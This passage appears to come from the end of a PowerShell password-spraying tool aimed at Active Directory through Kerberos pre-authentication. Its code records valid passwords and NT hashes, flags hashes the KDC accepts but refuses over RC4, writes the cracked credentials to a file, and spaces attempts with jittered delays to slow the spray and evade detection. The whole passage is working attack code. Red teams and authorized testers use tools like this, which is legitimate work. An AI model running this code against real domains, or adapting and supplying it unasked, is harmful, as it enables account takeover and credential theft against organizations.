                            Method     = $(if ($hashValidRC4Refused) { "Kerberos Pre-Auth (NT-Hash, RC4-HMAC) - hash valid, KDC refused RC4" } else { "Kerberos Pre-Auth (NT-Hash, RC4-HMAC)" })
                            RC4Refused = $hashValidRC4Refused
                        }
                    } else {
                        [PSCustomObject]@{
                            Username  = $cleanUsername
                            Password  = $secret
                            Domain    = $targetDomain
                            Timestamp = $timestamp
                            Method    = $(if ($ComputerDefault) { "Kerberos Pre-Auth (computer default password)" } else { "Kerberos Pre-Auth" })
                        }
                    }
                    $successfulCreds += $credInfo

                    if ($hashValidRC4Refused) {
                        Write-Host "[+] VALID HASH (KDC refused RC4): ${cleanUsername}@${targetDomain}:${secret}" -ForegroundColor Yellow
                    } else {
                        Write-Host "[+] SUCCESS: ${cleanUsername}@${targetDomain}:${secret}" -ForegroundColor Green
                    }

                    # Export to file if specified - a valid hash is a valid credential either way
                    if ($OutputFile) {
                        "${cleanUsername}:${secret}" | Out-File -FilePath $OutputFile -Append -Encoding ASCII
                    }

                    if ($StopOnSuccess) {
                        Write-Host "[*] Stopping on first success (StopOnSuccess flag set)" -ForegroundColor Yellow
                        break
                    }
                } elseif ($result.ErrorCode -eq 14) {
                    # Neither confirmed nor ruled out. A password the KDC refused AES256 for -
                    # typically an account without AES keys, so there is nothing to check it
                    # against; an NT hash whose refusal a wrong hash shared, or that could not
                    # be confirmed without risking a lockout. Either way no further secret
                    # would tell more, so the account is done with.
                    $notTestedCount++
                    $finishedAccounts[$username] = $true
                    Write-Verbose "[-] NOT TESTED: ${cleanUsername}@${targetDomain}:${secret} - $($result.Error)"
                } else {
                    if ($result.ErrorCode -eq 24) { $runFailures[$username] = [int]$runFailures[$username] + 1 }
                    Write-Verbose "[!] FAILED: ${cleanUsername}@${targetDomain}:${secret} - $($result.Error)"
                }

                # Apply delay with optional jitter
                if ($Delay -gt 0 -and $attemptNum -lt $usernames.Count) {
                    $actualDelay = $Delay
                    if ($Jitter -gt 0) {
                        $jitterAmount = [int]($Delay * ($Jitter / 100.0))
                        $actualDelay = $Delay + (Get-Random -Minimum (-$jitterAmount) -Maximum $jitterAmount)
                    }
                    Start-Sleep -Milliseconds $actualDelay
                }
            }

            if ($StopOnSuccess -and ($successCount + $rc4RefusedValidCount) -gt 0) {
                break
            }
        }
    }

    end {
        # A refused run has no summary to print - and no $startTime to subtract from.
        if ($abortRun) { return }

        $endTime = Get-Date
        $duration = ($endTime - $startTime).TotalSeconds

        Write-Host ""
        Write-Host "============================================================" -ForegroundColor Cyan
        Write-Host "  Password Spray Summary" -ForegroundColor Cyan
        Write-Host "============================================================" -ForegroundColor Cyan
        Write-Host "  Total Attempts:    $totalAttempts"
        Write-Host "  Successful:        $successCount" -ForegroundColor $(if ($successCount -gt 0) { "Green" } else { "Gray" })
        if ($rc4RefusedValidCount -gt 0) {
            # A hit like the line above, for the tester: the hash is right - a wrong one got
            # KDC_ERR_PREAUTH_FAILED. Kept apart because it yielded no Kerberos ticket.
            Write-Host "  Valid hash:        $rc4RefusedValidCount (KDC refused RC4 - no ticket, NTLM may accept it)" -ForegroundColor Yellow
        }
        Write-Host "  Failed:            $($totalAttempts - $successCount - $rc4RefusedValidCount - $notTestedCount)"
        if ($notTestedCount -gt 0) {
            $notTestedReason = if ($secretKind -eq 'NTHash') { 'KDC refused RC4, not confirmable' } else { 'KDC refused AES256' }
            $refusedEType = if ($secretKind -eq 'NTHash') { 'RC4' } else { 'AES256' }
            Write-Host "  Not tested:        $notTestedCount ($notTestedReason)" -ForegroundColor Yellow
            if ($notTestedCount -eq $totalAttempts) {
                Write-Host "  Result:            no $secretLabel could be tested - the KDC refused $refusedEType for every attempt" -ForegroundColor Red
            }
        }
        Write-Host "  Duration:          $([math]::Round($duration, 2)) seconds"
        Write-Host "  Rate:              $([math]::Round($totalAttempts / $duration, 2)) attempts/sec"
        if ($OutputFile -and ($successCount + $rc4RefusedValidCount) -gt 0) {
            Write-Host "  Output File:       $OutputFile" -ForegroundColor Green
        }
        Write-Host "============================================================" -ForegroundColor Cyan

        return $successfulCreds
    }
}
